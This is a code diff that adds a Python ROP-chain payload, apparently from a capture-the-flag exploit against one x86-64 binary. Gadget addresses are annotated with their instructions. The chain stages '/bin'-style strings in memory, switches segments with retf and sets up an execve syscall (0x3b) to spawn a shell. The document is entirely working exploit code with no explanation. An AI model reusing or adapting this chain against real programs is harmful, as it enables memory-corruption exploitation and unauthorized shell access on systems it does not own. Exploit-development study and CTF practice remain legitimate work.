@@ -1,0 +1,29 @@
+payload = p64(0x46ff03)
+#0x46ff03: pop rbx ; retf
+payload += p64(0x77069059)+p32(0x456f37)+p32(0x33)
+# 0x0000000000456f37: pop rdi; ret 6; 
+payload += p64(0x6e69622f)+p64(0x440965)+"\x00"*6
+# 0x0000000000440965: add dword ptr [rbx - 0x76b70001], edi; ret; 
+payload += p64(0x46ff03)
+# 0x46ff03: pop rbx ; retf
+payload += p64(0x7706905d)+p32(0x456f37)+p32(0x33)
+# 0x0000000000456f37: pop rdi; ret 6; 
+payload += p64(0x68662f)+p64(0x440965)+"\x00"*6
+# 0x0000000000440965: add dword ptr [rbx - 0x76b70001], edi; ret; 
+payload += p64(0x456f37)
+# 0x0000000000456f37: pop rdi; ret 6; 
+payload += p64(0x304bbf08)+p64(0x49e8cd)+"\x00"*6
+# 0x000000000049e8cd: xchg edi, eax; ret; 
+payload += p64(0x46b76a)
+# 0x000000000046b76a: pop rsi; sahf; add eax, 0xd0014800; jmp rax; 
+payload += p64(0x0)
+# 0x00000000004d0708: pop rdx; ret; 
+payload += p64(0x0)+p64(0x456f37)
+# 0x0000000000456f37: pop rdi; ret 6; 
+payload += p64(0x3b)+p64(0x49e8cd)+"\x00"*6
+# 0x000000000049e8cd: xchg edi, eax; ret; 
+payload += p64(0x456f37)
+# 0x0000000000456f37: pop rdi; ret 6; 
+payload += p64(0x4f9058)+p64(0x476cbc)+"\x00"*6
+# 0x0000000000476cbc: syscall; 
+payload += b''
